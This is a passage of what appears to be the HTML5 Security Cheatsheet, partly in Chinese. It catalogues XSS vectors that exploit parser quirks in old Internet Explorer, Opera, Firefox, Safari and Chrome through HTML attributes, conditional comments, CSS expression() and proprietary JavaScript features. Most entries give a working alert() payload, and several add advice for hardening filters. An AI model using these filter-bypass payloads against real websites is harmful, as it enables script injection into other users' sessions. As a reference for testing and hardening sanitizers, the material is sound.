*   [`www.microsoft.com/technet/security/advisory/2501696.mspx`](http://www.microsoft.com/technet/security/advisory/2501696.mspx)
*   [`technet.microsoft.com/security/bulletin/ms11-026`](http://technet.microsoft.com/security/bulletin/ms11-026)

reporter：Bolk, LeverOne

### XSS using "xmlns" attribute in custom tag when copying innerHTML (2)#97test

Internet Explorer incorrectly analyzes the attribute "xmlns" in custom tags when copying innerHTML - its value is being added to the tag <?XML:NAMESPACE> without any delimiters.

```
<!-- IE 5-9 --> <div id=d><x ></div> <script>d.innerHTML+='';</script> <!-- IE 10 in IE5-9 Standards mode --> <div id=d><x xmlns='"><iframe onload=alert(2)//'></div> <script>d.innerHTML+='';</script> 
```

Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it's supposed to.

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   internet explorer
*   script
*   dom
*   innerhtml

*   #59

*   #98
*   #128

reporter：LeverOne

### HTML separators and ignored characters#100test

[a] Characters accepted as tag name/attribute separators. Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32,47 Internet Explorer (5-9 SM): 11 [b] Characters ignored before attributes (and not accepted as parameter/attribute separators). Firefox, Internet Explorer, Safari, Google Chrome, Opera : 47 Internet Explorer (5-9 SM): 0 **[c] Characters ignored between attribute name and equals sign. Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer (5-9 SM): 0,11 [d] Characters accepted as parameter/attribute separators. Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer (5-9 SM): 11 [e] Characters ignored between equals sign and parameter. Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer (5-9 SM): 0,11 * Characters are given as decimal ASCII table index.** There is a common rule that the unencoded null character does not exist for IE HTML parser.

```
<img[a][b]src=x[d]onerror[c]=[e]"alert(1)"> 
```

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   firefox 4.0

*   firefox latest

*   opera 9.x

*   opera latest

*   chrome 5.0

*   chrome latest

*   safari 4.0

*   safari latest

*   xss

*   internet explorer
*   firefox
*   opera
*   chrome
*   safari
*   separator

*   [`shazzer.co.uk/vector/Characters-allowed-after-script`](http://shazzer.co.uk/vector/Characters-allowed-after-script)

*   [`shazzer.co.uk/vector/Attribute-separators`](http://shazzer.co.uk/vector/Attribute-separators)
*   [`shazzer.co.uk/vector/Characters-allowed-before-attribute-name`](http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name)
*   [`shazzer.co.uk/vector/Characters-allowed-after-attribute-name`](http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name)
*   [`shazzer.co.uk/vector/Quoteless-attributes-breaker`](http://shazzer.co.uk/vector/Quoteless-attributes-breaker)
*   [`docs.google.com/Doc?docid=0ASCeV1AnDNdWZGQ3eDVzbXdfMTZoZGQzNGdneg`](http://docs.google.com/Doc?docid=0ASCeV1AnDNdWZGQ3eDVzbXdfMTZoZGQzNGdneg)
*   #106

reporter：hasegawayosuke, .mario, RSnake,

### Characters ignored in the URI scheme#101test

The following characters *are ignored in the URI sheme: [a] All mentioned browsers: 9,10,13,32 IE, GC, Safari, Opera: 11,12 IE, GC, Safari, FF 3.6.28↓: 8 IE, GC, Safari: 1-7,14-31 Opera: 160,5760,6158,8192-8202,8232,8233,8239,8287,12288 Opera 11.52↓: 6159 IE (5-9 SM): 0 [b],[c] IE, GC, Safari 4.0.3↓, FF 4-6, Opera 10.63↓: 9,10,13 GC 7↓, Safari 4.0.3↓: 1-8,11,12 IE (5-9 SM): 0 Safari 4.0.4↑, Opera 11↑, FF 7↑: nothing* Characters are given as decimal ASCII table index.

```
<a href="[a]java[b]script[c]:alert(1)">XXX</a> 
```

*   internet explorer 6.0
*   internet explorer latest

*   firefox 4.0

*   firefox latest

*   opera 10.0

*   opera latest

*   chrome 5.0

*   chrome latest

*   safari 4.0

*   safari latest

*   xss

*   javascript
*   internet explorer
*   script
*   chrome
*   safari

*   [`shazzer.co.uk/vectors?search=protocol`](http://shazzer.co.uk/vectors?search=protocol)

reporter：Gareth, .mario, RSnake

### Forced plaintext via unbalanced quotes in Internet Explorer#102test

Internet Explorer treats any tag as plaintext in case the attribute delimiters are unbalanced - in this example caused by the . In unbalanced quotes appear inside or outside an attributes - preceded by an arbitrary character but the equals sign - the usage of HTML inside attributes is possible and the content will be rendered as regular HTML. The problem has been reported and will be taken care of in later versions of the Internet Explorer.

```
<img src="x` `<script>alert(1)</script>"` `> 
```

*   internet explorer 6.0
*   internet explorer 8.0 (unpatched)

*   xss

*   javascript
*   internet explorer
*   parser
*   backtick
*   plaintext

*   #62

*   #108
*   #133

reporter：.mario, hasegawayosuke

### Safari attribute ofuscation with slashes and quotes#106test

Safari accepts slashes and quotes (if preceded by whitespace, slashes or other quotes) between attribute names and the equals character (name/"'=value). This enables interesting possibilities to obfuscate HTML strings, bypass filters and mimick attributes like in the given example.

```
<img src onerror /" '"= alt=alert(1)//"> 
```

*   safari 4.0
*   safari 4.0.3

*   xss

*   javascript
*   safari
*   attributes
*   delimiter
*   parser

reporter：Superhei, .mario

### JavaScript execution via <TITLE> tag on Inernet Explorer 9#107test

Internet Explorer 9 allows execution of JavaScript via onpropertychange event handler on <title> tags if another <title> tag follows up - having at least one valid attribute. This vector works in IE6-8 Standards mode and in IE9 quirks mode.

```
<title onpropertychange=alert(1)></title><title title=></title> 
```

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   title
*   onpropertychange
*   internet explorer

reporter：.mario

### Internet Explorer parameter parsing issue#108test

Internet Explorer treats the sequence of any quotes that follows the equal sign in a parameter without delimiters as the beginning of some semblance of new parameter.

```
<!-- IE 5-8 standards mode --> <a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(1)></a>"> <!-- IE 5-9 standards mode --> <!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//"> <?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//"> 
```

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   parameter
*   parsing
*   internet explorer

*   #62

*   #102

reporter：Algol, jackmasa, sirdarckcat

### Internet Explorer conditional comments - XSS via [if]> and <img> injection#115test

Conditional comments on Internet Explorer can cause trouble as soon as an attacker is able to inject rectangular brackets wrapping the words if and endif with almost arbitrary suffixes. A condition always being true will lead to immediate parsing of the enclosed markup on all tested Internet Explorer versions. The second example injects an <img> tag into the comment condition leading to immediate JavaScript execution as well. The examples are worked up to IE 9 standards mode.

```
<!--[if]><script>alert(1)</script --> <!--[if<img src=x onerror=alert(2)//]> --> 
```

Make sure an attacker cannot turn a comment injection into a conditional comment by using rectangular brackets such as shown in the example. Comment content should be escaped like regular markup - the delimiting sequence --> is neither sufficient nor necessary to successfully close a comment.

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   conditional
*   comments
*   internet explorer
*   rectangular

*   [`msdn.microsoft.com/en-us/library/ms537512%28v=vs.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms537512%28v=vs.85%29.aspx)

*   #37
*   #38

reporter：.mario

### Webkit 浏览器中反斜线替代斜线#124test

Safari 将内部 URL 属性中的反斜线当作斜线处理。chrome 将 URL 头的”/\”当作”//”处理

```
<script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10 <script src="\\example.com\foo.js"></script> // Safari 5.0 
```

*   chrome 9.0
*   chrome latest

*   safari 5.0

*   safari latest

*   html

*   dom

reporter：hasegawayosuke

### QuickTime 事件导致 JavaScript 代码执行#126test

在上方展示的经过构造的用法或多或少会触发 QuickTime 的未知 DOM 事件。那些包含下划线”_”的事件句柄很罕见，使它可以绕过大多数黑名单过滤。这一攻击只有满足以下条件才能生效：两个<object>标签；前一个<object>标签为后一个<object>标签提供了必要的 behavior

```
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object> 
```

*   internet explorer 6.0
*   internet explorer 10.0

*   quicktime

*   html
*   event
*   object
*   classid
*   xss

*   [`developer.apple.com/library/mac/#documentation/QuickTime/Conceptual/…ocument/QuickTimeandJavaScri.html#//apple_ref/doc/uid/TP40001526-CH001-SW6`](http://developer.apple.com/library/mac/#documentation/QuickTime/Conceptual/…ocument/QuickTimeandJavaScri.html#//apple_ref/doc/uid/TP40001526-CH001-SW6)

reporter：.mario

### 使用属性界定符打破 IE 注释元素#133test

在 IE9 以下的版本中中可以使用`打破注释元素

```
<!-- `<img/src=xx:xx onerror=alert(1)//--!> 
```

不允许用户提交注释标签

*   internet explorer 6.0
*   internet explorer 8.0

*   xss

*   comments
*   internet explorer
*   backtick

*   #62

*   #102
*   #115

reporter：jackmasa

### "<% %>" and "<!-- -->" inside plaintext tags#134test

Structures "<%" и "<!--" allow the IE parser to consider closing tag in plaintext tags such as <textarea>, <comment>, <xmp> and others as a part of the plaintext until it finds the structure "%>" or "-->". The syntax in the tags such as <style>, <script> should be valid taking into account these sections, otherwise throws an exception. So, the second example shows that closing </script> tag will be considered as an operator "less" and the regular expression start. The examples are worked up to IE 9 standards mode. SGML-like comment delimiters is similarly parsed in older versions of Safari.

```
<xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'> <script> x='<%' </script> %>/ alert(2) </script> XXX <style> *['<!--']{} </style> -->{} *{color:red}</style> 
```

Encode all opening brakets inside plaintext tags. Escape for the closing tags ("<\/script>") is not sufficient.

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   safari 3.0

*   safari 4.0.3

*   xss

*   plaintext
*   internet explorer
*   safari
*   comment
*   SGML
*   escape

*   #91

*   #38
*   #40

reporter：sirdarckcat, wpulog

## 基于 CSS 注入的向量

### 使用 Opera 的 CSS 属性 link-source 执行 javascript#9test

Opera 允许给任何 HTML 元素设置 link sources,它们将可以点击和执行 javascript.注意:opera 11 要求是<a>标签,早期版本任意

```
<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a> 
```

*   opera 8.0
*   opera 12.0 (limited)

*   xss

*   css
*   link-source
*   opera
*   proprietary

*   [`www.aptana.com/reference/html/api/CSS.field.-o-link-source.html`](http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html)

*   [`hackvertor.co.uk/hvurl/3c`](https://hackvertor.co.uk/hvurl/3c)

reporter：.mario

### Opera whole-page click hijacking via CSS#27test

Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href. Note that as of Opera 11 -o-link only applies for <a> tags. On IE selector is broken up to IE 7 standards mode.

```
<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style> 
```

In case users are allowed to submit CSS make sure the properties allowed are whitelisted and attribute selector content does not allow the combination {...} because it breaks out the attribute selector and allows declaration of new properties.

*   opera 8.x
*   opera 11.64

*   xss

*   javascript
*   css
*   opera
*   attribute selectors
*   proprietary

*   [`www.aptana.com/reference/html/api/CSS.field.-o-link-source.html`](http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html)

*   #9

reporter：.mario

### JavaScript execution via <LINK> href attribute and data URI#29test

Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <LINK> tag. The example works up to IE 7 standards mode.

```
<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d 
```

Make sure stylesheet URIs cannot be controlled by the user - and user submitted <LINK> tags will not be displayed unfiltered.

*   internet explorer 8.0
*   internet explorer 10.0

*   xss

*   javascript
*   internet explorer
*   css
*   style
*   expression
*   datauri
*   proprietary

reporter：.mario

### JavaScript execution via <STYLE> @import and data URI#30test

Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <STYLE> @import directive. The example works up to IE 7 standards mode.

```
<style>@import "data:,*%7bx:expression(write(1))%7D";</style> 
```

Make sure stylesheet URIs cannot be controlled by the user - and user submitted <STYLE> cannot contain the @import directive.

*   internet explorer 8.0
*   internet explorer 10.0

*   xss

*   javascript
*   internet explorer
*   css
*   style
*   expression
*   datauri
*   proprietary

*   [`msdn.microsoft.com/en-us/library/ms530768%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms530768%28VS.85%29.aspx)

reporter：.mario

### Breaking pointer-events:none with nested links#33test

Firefox 3.6+ allows using CSS "pointer-events" with value "none" to make sure an element will not react on any mouse/pointer based event. This feature enables for example placing a DIV over another DIV without blocking the click events addressed to the underlying DIV.

```
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a> 
```

The feature breaks as soon as <A> elements are being used in combination with "pointer-events:none" - containing other <A> elements. <A> elements should not be used for pointer-event logic at all - especially not when containing user controlled HTML.

*   firefox 3.6
*   firefox latest

*   safari 5.0

*   safari latest

*   chrome 7.0

*   chrome latest

*   internet explorer 10.0

*   internet explorer latest

*   opera 10.0

*   opera latest

*   xss

*   hijacking
*   css
*   pointer-events
*   firefox
*   safari
*   chrome

*   [`hacks.mozilla.org/2009/12/pointer-events-for-html-in-firefox-3-6/`](http://hacks.mozilla.org/2009/12/pointer-events-for-html-in-firefox-3-6/)

reporter：.mario

### Opera @import based XSS inside attribute selectors#44test

Opera 10 and later version including latest Opera 10.5 allow breaking out an attribute selector with {} and use @import declarations afterwards. The MIME type for the imported file does not matter - also it can be loaded from arbitrary domains. The imported file contains CSS code to apply a JavaScript URI to all elements on the page to hijack any incoming click.

```
<style>*[{}@import'test.css?]{color: green;}</style>X 
```

Make sure in user submitted CSS the contents of attribute selectors are properly escaped with backslashes. Also make sure to use a CSS property:value whitelist to forbid properties like -o-link and -o-link-source.

```
* {-o-link:'javascript:alert(1)';-o-link-source: current;}crossdomain: 1path: [`html5sec.org/test.css`](http://html5sec.org/test.css)name: test.css 
```

*   opera 8.0
*   opera 11.64

*   xss

*   javascript
*   opera
*   css
*   hijacking
*   proprietary

reporter：.mario

### CSS-string breaking#45test

Opera, Firefox and other browsers allow breaking out an css-string with newline symbols. A string cannot directly contain a newline in CSS2+. [a] Characters*, accepted as CCS-strings breakers: Firefox, Internet Explorer (IE8+ standards mode), Opera, Google Chrome, Safari: 10,12,13 Opera 11.01↓, Google Chrome 16↓, Safari: 1-8,11,14-31,127 Opera 11.01↓: 0* Characters are given as decimal ASCII table index.

```
<div style="font-family:'foo[a];color:red;';">XXX</div> 
```

*   opera 8.0
*   opera latest

*   firefox 1.x

*   firefox latest

*   chrome 3.0

*   chrome latest

*   safari 3.0

*   safari latest

*   internet explorer 8.0

*   internet explorer latest

*   trick

*   opera
*   firefox
*   chrome
*   firefox
*   internet explorer
*   css

reporter：LeverOne, Michal Zalewski

### Alternative CSS syntax in Internet Explorer#46test

Internet Explorer allows to use right curly brace (}) as a group separator (up to IE 7 standards mode). A CSS declaration in quirks mode (IE 5 standards mode) may consist of a property name, followed by a symbol of equality (=).

```
<div style="font-family:foo}color=red;">XXX</div> 
```

*   internet explorer 5.5
*   internet explorer latest (in older docmodes)

*   xss

*   internet explorer
*   css
*   quirks mode
*   proprietary
*   trick

reporter：Gareth, LeverOne, sirdarckcat

### Obfuscation css-properties and values via ignored extra characters#60test

[a] Extra characters *ignored before property names (excluding backslash (92) and null character (0)) Firefox, Internet Explorer (any modes), Safari, Google Chrome, Opera : 9,10,12,13,32 Firefox, Internet Explorer**, Opera: 123*** Firefox 3.x, Internet Explorer**: 8 Internet Explorer**: 1-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279 Internet Explorer**: CSS-strings [b] Extra characters ignored between property names and colon. Firefox, Internet Explorer (any modes), Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer**: 11 Internet Explorer (quirks mode): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127 Internet Explorer (quirks mode): CSS-strings, alnum sequences after non-alnum characters (color,foo:red) [c] Extra characters ignored before values Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer: 0,11,160,8192-8203,12288,65279 *These are given in decimal codes. **Up to IE 7 standards mode.*** Ignored only before first property names.

```
<div style="[a]color[b]:[c]red">XXX</div> 
```

*   firefox 2.x
*   firefox latest

*   opera 9.x

*   opera latest

*   internet explorer 6.0

*   internet explorer latest

*   chrome 5.0

*   chrome latest

*   safari 4.0

*   safari latest

*   trick

*   css
*   quirks mode
*   obfuscation
*   opera
*   firefox
*   internet explorer
*   chrome
*   safari
*   fuzzing
*   quirks mode

reporter：Gareth, hasegawayosuke, LeverOne, .mario, RSnake, sirdarckcat

### CSS encoding and escaping#61test

[a] Encoding. There are only three tricks to encode characters. [1] You can change the number of zeros: \0A -> \00000A [2] You can change the capital letter: \0A -> \0a [3] You can change the whitespace *accepted as delimiters after the encoded character. Firefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,13,32 Internet Explorer (IE7↓ Standards mode): 11,160,8192-8203,12288,65279 Properties in IE7↓ Standards mode may contain encoded null-character (\0). On Opera and in IE8+ Standards mode encoded null-character cuts off the right side of a CSS structure. The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. [b] Escaping. In addition, you can put a backslash before the character. Option of writing a null-character in Internet Explorer 7↓ Standards mode is escaping of any whitespace-character accepted as delimiters: col\&#160or:red In IE quirks mode inside the url() function a backslash can be treated as equivalent of a slash and thus will not have the escape role. Of course, these methods can be combined with other encoding and obfuscation (for example, change case of original characters).* These are given in decimal codes.

```
<div style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div> 
```

*   firefox 1.5
*   firefox latest

*   opera 8.0

*   opera latest

*   internet explorer 6.0

*   internet explorer latest

*   chrome 7.0

*   chrome latest

*   safari 4.0

*   safari latest

*   xss

*   javascript
*   css
*   encoding
*   escape
*   backslash
*   opera
*   firefox
*   internet explorer

*   [`www.w3.org/TR/css3-syntax/#characters`](http://www.w3.org/TR/css3-syntax/#characters)

*   [`www.w3.org/TR/CSS2/syndata.html#escaped-characters`](http://www.w3.org/TR/CSS2/syndata.html#escaped-characters)

reporter：Gareth, LeverOne, Renaud Lifchitz, .mario

### Slash-tags accepting style attributes#71test

A slash-tag can still contain style attributes on IE as the example shows. For extra obfuscation a bogus CSS property is being used to execute the JavaScript via expression() combined with CSS escapes. This example works up to IE 7 standards mode.

```
<// style=x:expression\28write(1)\29> 
```

Make sure the HTML filter you use deals with slash-tags and doesn't consider them to be plain text. Also be aware of CSS escapes and how they can completely obfuscate any style info inside <STYLE> tags and "style" attributes.

*   internet explorer 6.0
*   internet explorer 10.0

*   xss

*   javascript
*   closing tag
*   css
*   style
*   expression
*   internet explorer
*   quirks mode

*   [`msdn.microsoft.com/en-us/library/ms537634%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms537634%28VS.85%29.aspx)

*   [`www.w3.org/TR/CSS2/syndata.html`](http://www.w3.org/TR/CSS2/syndata.html)

reporter：Gareth, .mario

### IE6 and halfwidth/fullwidth Unicode characters#80test

This example shows how halfwidth/fullwidth Unicode characters can be used on IE6 to substitute characters from the ASCII range. Note that those characters have been used in the example to create the term "expression".

```
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style> 
```

In case your website still has a lot of IE6 users make sure that the range of halfwidth and fullwidth form characters (U+FF00-FFEF) cannot be used in user submitted markup and styles.

*   internet explorer 6.0

*   xss

*   javascript
*   css
*   expression
*   unicode
*   halfwidth
*   fullwidth
*   internet explorer

*   [`en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_Unicode_block`](http://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_Unicode_block)

reporter：.mario

### SVG images containing XML data - with disabled JavaScript#90test

Opera supports the CSS property "content" for style attributes. The SVG image can contain SVG as well as HTML code. The example for Opera 10.x shows how a <FORM> tag can be used to trick the user into clicking a button and thus executing JavaScript. Example for Opera 12.x shows one of the problems (along with a client side DoS, running the "onblur" event, etc), which is generated because of the possibility to steal a focus via embeded SVG image. The same works of course for SVG files embedded via <IMG> tags.

```
<!-- Up to Opera 10.63 --> <div style=content:url(test2.svg)></div> <!-- Up to Opera 11.64 - see link below --> <!-- Up to Opera 12.x --> <div style="background:url(test5.svg)">PRESS ENTER</div>``<form  target="_top" action="javascript:alert(1)"> <!-- this file can be crossdomain if "action" attribute refers to an external file --> <meta http-equiv="refresh" content="1;URL=test5.svg"/> <input type="submit" autofocus="autofocus"/> </form>required_mime: image/svg+xmlcrossdomain: 0path: [`html5sec.org/test5.svg`](http://html5sec.org/test5.svg)name: test5.svg 
```

*   opera 10.x
*   opera 12.0

*   xss

*   svg
*   css
*   opera
*   content
*   form

*   [`heideri.ch/opera/`](http://heideri.ch/opera/)

reporter：LeverOne

### Breaking the functional notation on IE (1)#92test

To break the functional notation on IE "url()" can be used combined with a following whitespace - then followed by any non-whitespace character. The following characters *are whitespaces: IE 6,7 standards mode: 9-13,32,160,8192-8203,12288,65279 IE 8 standards mode: 1-32,127* These are given in decimal codes.

```
<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div> 
```

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   css
*   internet explorer
*   trick
*   notation

*   #111

*   #112
*   #114

reporter：LeverOne

### Multiple CSS "url()" values in IE 6#93test

Internet Explorer supports multiple "url()" values all of which can contain payload. The delimiter between the "url()" values should be a whitespace character ("\x20" in the given example).

```
<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div> 
```

Make sure in case the user is allowed to submit CSS it is being filtered and whitelisted correctly to avoid attacks via multiple backgrounds.

*   internet explorer 6.0

*   xss

*   css
*   internet explorer
*   trick
*   url

reporter：LeverOne

### Style injection when copying innerHTML (3)#98test

The example shows that Internet Explorer and Mozilla Firefox automaticaly decode CSS-encoding if the harmless markup is copied using innerHTML.

```
<div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script> 
```

Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it's supposed to.

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   firefox 2.x

*   firefox 3.6.28

*   xss

*   javascript
*   internet explorer
*   script
*   dom
*   innerhtml
*   css

*   #59

*   #97
*   #128

reporter：sirdarckcat

### Using comments to obfuscate styles#99test

As noted in CSS2.1 specification (and repeated in CSS3), comments may occur anywhere outside other tokens. The cases that are exceptions to this rule are a subject to special attention. First of all the CSS2.1 specification is inconsistent, since, for example, the "!important" token in his definition allows comments. Despite the exclusion this feature in CSS3, IE (8-9 standards mode) and Firefox 13 still support "!/**/important". You can find more obvious mistakes, for example, the same Firefox 13 allows "font-family: Ar/**/ial". Special interest are exceptions to this rule in IE. The first example shows the possibility for comments in the value of the property. The third example, in addition to demonstrating a similar possibility inside the "url()" function, is also an interesting case, when a comment can not be replaced by any other structure (another space or encoded space "\000020" will not give necessary effect). Typically these cases occur when the token does not match your precise definition. In this example token "url" can not contain a space character. Inside the <STYLE> tag, there are rules for parsing the SGML comment delimiters, that are allowed before and after statements regardless of the form (opening/closing) and nesting.

```
XXX<style> *{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */ <!-- --><!--*{color:red} /* all UA */ *{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */ </style> 
```

*   internet explorer 6.0
*   internet explorer latest

*   firefox 3.x

*   firefox latest

*   opera 9.x

*   opera latest

*   chrome 4.0

*   chrome latest

*   safari 3.0

*   safari latest

*   trick

*   css
*   obfuscation
*   internet explorer
*   firefox
*   opera
*   chrome
*   safari
*   comment

*   [`www.w3.org/TR/css3-syntax/#comments`](http://www.w3.org/TR/css3-syntax/#comments)

*   [`www.w3.org/TR/CSS2/syndata.html#uri`](http://www.w3.org/TR/CSS2/syndata.html#uri)
*   [`www.w3.org/TR/css3-syntax/#grammar0`](http://www.w3.org/TR/css3-syntax/#grammar0)
*   [`www.w3.org/TR/CSS2/grammar.html`](http://www.w3.org/TR/CSS2/grammar.html)

reporter：Roman Ivanov, LeverOne

### Breaking the functional notation on Chrome and Safari (2)#111test

To break the functional notation "url()" can be used in combination with the following characters*: [a] 1-8,10-31,127,9,32,40 Note that simultaneous breaking of functional notation and strings can be accomplished by the characters listed in #45\.* Characters are given as decimal ASCII table index.

```
<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div> 
```

*   chrome 5.0
*   chrome latest

*   safari 4.0

*   safari latest

*   xss

*   css
*   google chrome
*   safari
*   trick
*   notation

*   #45

*   #92
*   #112
*   #114

reporter：LeverOne, .mario

### Breaking the functional notation on IE (3)#112test

If any *part of the CSS-declaration (property or value) contains a left curly brace ({ - not as part of a string), the CSS declaration cannot be closed without using a matching right curly brace (}). In most browsers this feature can not be used to bypass filters - as they require to close the strings, functions and attributes inside blocks. IE nevertheless does not require to close function inside such blocks. It is important to take into account especially when filtered styles are inside the targeted tag's attribute. The example works up to IE 7 standards mode.* There's another exception for IE (see the letters [a] and [b] of #60).

```
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div> 
```

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   css
*   internet explorer
*   trick
*   notation

*   #46

*   #60
*   #92
*   #111
*   #114

reporter：LeverOne

### Jump into the selector via attribute delimiters#113test

According to established practice selectors are usually filtered less thoroughly by filtering software than other parts of CSS language constructs. This example shows how to leave a CSS-block open to get hands on a selector and inject code into a possibly less thoroughly filtered area. On IE this example works in IE 8-9 standards mode.

```
<div id="x">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style> 
```

*   firefox 2.x
*   firefox latest

*   opera 9.x

*   opera 12.0

*   internet explorer 8.0

*   internet explorer latest (in older docmodes)

*   xss

*   css
*   firefox
*   opera
*   trick
*   selector
*   attribute

*   #27

reporter：LeverOne

### Breaking the functional notation on Chrome and Safari (4)#114test

The functional notation breaker shown in #111 also works with quoted strings for several CSS properties. The following characters can be used to break the string and create a new property-value pair: [a] Safari, Chrome 16↓: 1-8,10-31 and 127 Chrome 17↑: 10,12,13 (decimal ASCII table index)

```
<x style="background:url('x[a];color:red;/*')">XXX</x> 
```

*   chrome 5.0
*   chrome latest

*   safari 4.0

*   safari latest

*   opera 15.0

*   opera latest

*   xss

*   css
*   google chrome
*   safari
*   trick
*   notation

*   #45

*   #92
*   #111
*   #112

reporter：.mario, LeverOne

## 纯 javascript 的向量

### 基于 Firefox setter 执行 Javascript#6test

在 Gecko/Firefox 里可以使用 setter 间接调用 Javascript 函数,而不需要括号.

```
<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script> 
```

*   firefox 1.x
*   firefox 3.6.28

*   xss

*   dom
*   firefox
*   setter
*   proprietary

*   [`developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters`](https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters)

reporter：.mario

### 使用 sharp variables 执行 Javascript#15test

这个向量展示了 sharp variables 和循环引用能用与做混淆和隐式执行代码

```
<script>({0:#0=alert/#0#/#0#(0)})</script> 
```

*   firefox 2.x
*   firefox 11.0

*   xss

*   javascript
*   firefox
*   sharp
*   proprietary

*   [`developer.mozilla.org/en/Sharp_variables_in_JavaScript`](https://developer.mozilla.org/en/Sharp_variables_in_JavaScript)

reporter：.mario

### 通过覆盖 ReferenceError 对象执行 Javascript#20test

这个 Javascript 向量展示了如何覆盖 ReferenceError 对象,并引起错误,从而导致 Javascript 执行.

```
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script> 
```

在用户可以注入脚本的情况下不要相信 DOM,即便是 DOM 属性的访问.

*   opera 8.x
*   opera 11.01

*   firefox 1.x

*   firefox 15.0

*   chrome 3.0

*   chrome 9.0

*   safari 4.0

*   safari 5.1.7

*   javascript

*   opera
*   firefox
*   chrome
*   safari
*   ReferenceError
*   overwrite

*   [`developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Functions/ReferenceError`](https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Functions/ReferenceError)

reporter：.mario

### 通过私有属性 **noSuchMethod**执行 Javascript#21test

Firefox 支持非标准的属性 **noSuchMethod** ,它可以使我们在访问一个对象不存在的方法时自动拦截.我们可以利用它执行 Javascript 而不需要使用 funtion(){...}这样的方法.

```
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script> 
```

*   firefox 3.5
*   firefox latest

*   xss

*   javascript
*   firefox
*   **noSuchMethod**
*   proprietary

*   [`developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/noSuchMethod`](https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/noSuchMethod)

reporter：Gareth, .mario

### Spoofing the address bar information with history.replaceState()#103test

